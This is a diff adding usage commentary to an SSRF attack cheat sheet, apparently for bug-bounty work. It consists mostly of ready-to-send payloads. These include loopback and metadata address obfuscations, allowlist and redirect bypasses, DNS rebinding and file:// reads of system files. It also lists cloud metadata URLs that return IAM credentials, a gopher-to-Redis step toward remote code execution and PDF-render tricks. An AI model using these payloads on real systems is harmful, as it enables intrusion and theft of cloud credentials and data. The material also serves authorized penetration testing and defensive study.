@@ -5,6 +5,7 @@
 ---
 
 ## A. Baseline / confirm (guide §4)
+*What & when:* your **very first** move on any suspected sink — point it at your own logging server (`oast.fun`) and check the callback's **source IP**. Server/cloud IP = real (server-side) SSRF; your own IP = not SSRF. Also drop your OAST host into the listed **headers** on every request, since many hidden SSRFs live there.
 ```
 url=http://YOUR.oast.fun/baseline           # watch interactsh: SOURCE IP = server? = SSRF
 url=http://YOUR.oast.fun:80/                 # HTTP hit
@@ -17,6 +18,7 @@ True-Client-IP: YOUR.oast.fun
 ```
 
 ## B. Reachability probes (guide §5)
+*What & when:* right after baseline — walk the server from the outside ring inward to find the deepest place it'll reach (that depth = your severity ceiling). Loopback (`127.0.0.1` = the box itself), then internal ranges, then the metadata vault, then a local file. Whatever's reachable decides which section below you go to next.
 ```
 http://127.0.0.1/         http://localhost/        http://0.0.0.0/        http://[::1]/
 http://127.0.0.1:6379/    http://127.0.0.1:9200/   http://127.0.0.1:8080/  http://127.0.0.1:2375/
@@ -26,6 +28,7 @@ file:///etc/hostname
 ```
 
 ## C. IP & host obfuscation — 127.0.0.1 (guide §6)
+*What & when:* use these when a filter blocks the literal `127.0.0.1`/`localhost`. Each line is the **same address in a different costume** (decimal/hex/octal/short/IPv6/wildcard-DNS) — the filter reads them as "not blocked," but the OS still connects to loopback. Try them one at a time.
 ```
 2130706433                 decimal
 0x7f000001  0x7f.0x0.0x0.0x1   hex
@@ -38,6 +41,7 @@ file:///etc/hostname
 ```
 
 ## D. IP & host obfuscation — 169.254.169.254 metadata (guide §6/§11)
+*What & when:* same disguise trick aimed at the **cloud credential vault** — use these when the literal `169.254.169.254` is blocked. Start with **decimal `2852039166`** and the **IPv6-mapped** form; one of them usually reaches the metadata service.
 ```
 2852039166                 decimal
 0xa9fea9fe  0xA9.0xFE.0xA9.0xFE   hex
@@ -50,6 +54,7 @@ http://1ynrnhl.oast.fun → (your DNS A record) → 169.254.169.254   custom DNS
 ```
 
 ## E. Allowlist / parser-confusion bypasses (guide §9)
+*What & when:* use these when the app only allows a specific host (e.g. `allowed.com`). Each line is a URL crafted so the **checker** reads the host as `allowed.com` but the **connector** connects to the internal IP — the `@`, `#`, `\`, extra-dot, and CRLF variants all exploit that parser disagreement. Send one, confirm via the in-band response or a metadata marker that it reached the *internal* target.
 ```
 http://allowed.com@169.254.169.254/
 http://169.254.169.254#@allowed.com/        http://169.254.169.254#.allowed.com
@@ -67,6 +72,7 @@ double-encode: %25%36%39 ... (validator decodes once, client twice)
 ```
 
 ## F. Redirect-based bypass (guide §8)
+*What & when:* use when the fetcher validates the *first* URL but **follows redirects**. You hand it an allowed/your-own URL that replies "302 → go to the internal target"; it passed the door check, then follows you inward. The open-redirect-on-allowed-host variant also clears "must be same domain" checks.
 ```
 # Host on YOUR-HOST (poc/redirect_server.py):
 http://YOUR-HOST/r   →  302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
@@ -77,6 +83,7 @@ https://allowed.com/out?to=http://127.0.0.1:6379/
 ```
 
 ## G. Protocols (guide §10)
+*What & when:* always test which **schemes** (the bit before `://`) the fetcher accepts — it changes everything. `file://` reads the server's own disk; `dict://` grabs a service banner; `gopher://` sends raw bytes to any internal service (→ RCE, section J). The last line is how to test whether gopher is even live.
 ```
 file:///etc/passwd   file:///proc/self/environ   file:///etc/hostname   file:///C:/Windows/win.ini
 dict://127.0.0.1:6379/INFO     dict://127.0.0.1:11211/stats
@@ -86,6 +93,7 @@ ftp://127.0.0.1/   ldap://127.0.0.1/
 ```
 
 ## H. Cloud metadata endpoints (guide §11)
+*What & when:* once you can reach `169.254.169.254`, these are the exact URLs that return the **credentials** (per cloud provider). AWS IMDSv1 needs no header (easiest); IMDSv2, GCP, and Azure require a header, so you need gopher/header-control to reach them. The AWS `iam/security-credentials/<ROLE>` line is the money shot.
 ```
 # AWS (IMDSv1 — no header):
 http://169.254.169.254/latest/meta-data/
@@ -113,6 +121,7 @@ http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&res
 ```
 
 ## I. Internal port scan targets (guide §12)
+*What & when:* when you have internal HTTP reach but no metadata, scan these high-value ports to find an internal service to hit — an open port + banner is a target. The in-band read examples pull real data straight out of common internal services (Elasticsearch indices, Spring config, Consul KV).
 ```
 22 SSH · 25/587 SMTP · 80/443 web · 2375 Docker · 3306 MySQL · 5432 Postgres · 5601 Kibana
 6379 Redis · 8080/8443 internal apps · 8500 Consul · 9000 Sonar/Portainer · 9200/9300 Elasticsearch
@@ -122,6 +131,7 @@ http://127.0.0.1:9200/_cat/indices    http://127.0.0.1:8080/actuator/env    http
 ```
 
 ## J. gopher → internal service (guide §13)  — use Gopherus / poc/gopher_redis.py
+*What & when:* when gopher is accepted (section G) **and** you found an internal service (section I), this is the SSRF→RCE step. Gopherus builds the raw-byte payloads for you (Redis/FastCGI/MySQL/SMTP). **Prove control with the benign marker first** (already Critical); do the cron/SSH/webshell escalation only with authorization + cleanup.
 ```
 # Redis (BENIGN proof first): SET a marker, then read it / INFO
 gopher://127.0.0.1:6379/_%2A1%0d%0a%244%0d%0aINFO%0d%0a
@@ -135,6 +145,7 @@ python3 poc/gopher_redis.py --host 127.0.0.1 --port 6379 --benign     # SET ssrf
 ```
 
 ## K. PDF / headless / image-render SSRF (guide §16)
+*What & when:* use on any "export to PDF / screenshot / print" feature — a server-side browser renders HTML you control, so these tags make it fetch metadata/files and **draw the result into the PDF you download** (turning a blind feature into a full read). One of the highest-yield SSRF surfaces.
 ```html
 <iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
 <img src="file:///etc/passwd">
@@ -145,6 +156,7 @@ python3 poc/gopher_redis.py --host 127.0.0.1 --port 6379 --benign     # SET ssrf
 ```
 
 ## L. Automation (guide §25)
+*What & when:* to surface candidates fast across many URLs/hosts — inject your OAST host everywhere and watch for callbacks, then verify the internal/metadata reach **by hand** (never submit "a tool got a callback"). SSRFmap/Gopherus automate the exploitation once you've found the sink.
 ```bash
 # Burp "Collaborator Everywhere" (passive header injection) — finds hidden SSRF.
 cat urls.txt | qsreplace 'http://YOUR.oast.fun' | httpx -silent    # then watch interactsh
@@ -154,6 +166,7 @@ python3 poc/ssrf_probe.sh https://target/fetch url YOUR.oast.fun   # fires the m
 ```
 
 ## M. AWS ECS / Lambda / EKS container credentials (guide §11) — often missed, high-value
+*What & when:* try these when the classic EC2 metadata IP (`169.254.169.254`) returns **nothing** — that usually means you're on a container/serverless setup where the creds live elsewhere: ECS/Fargate at **`169.254.170.2`**, Lambda in **env vars** (read via `file:///proc/self/environ`), EKS via the **IRSA token file**. This is the modern reality and the most-missed Critical, so always check `169.254.170.2` when the EC2 IP is dead.
 ```
 # ECS/Fargate task role creds (relative URI in env AWS_CONTAINER_CREDENTIALS_RELATIVE_URI):
 http://169.254.170.2/v2/credentials/<GUID>
@@ -169,6 +182,7 @@ http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}
 ```
 
 ## N. DNS rebinding & advanced reach tooling (guide §7)
+*What & when:* the bypass for apps that "resolve the name → check it's public → fetch." These services (or your own DNS) answer the **check** with a public IP and the **fetch** with an internal IP, milliseconds apart, so the check passes but the connection lands internal. Only works when the app does two separate look-ups without pinning the first IP.
 ```
 # Services that flip a name from a public IP (validation) to an internal IP (fetch):
 make-it-rebind / rbndr (taviso):  <pubhex>.<internalhex>.rbndr.us       e.g. 7f000001.<x>.rbndr.us
@@ -179,6 +193,7 @@ nip.io / sslip.io / localtest.me: static wildcard → embedded IP (passes "must 
 ```
 
 ## O. Real-world SSRF CVEs & bug-bounty chains (guide §11/§16)
+*What & when:* reference/learning — real cases proving each pattern above actually pays. Read the disclosed reports to train your eye for the equivalent feature on your target (the entry points at the bottom — webhook, import-from-URL, link-preview, avatar-by-URL — are where you'll actually start).
 ```
 □ Capital One (2019) — WAF SSRF → IMDSv1 → IAM role creds → S3 dump (the canonical SSRF→cloud-takeover).
 □ GitLab CVE-2021-22214 — unauth SSRF via CI lint / project import (URL fetch) → internal/metadata.
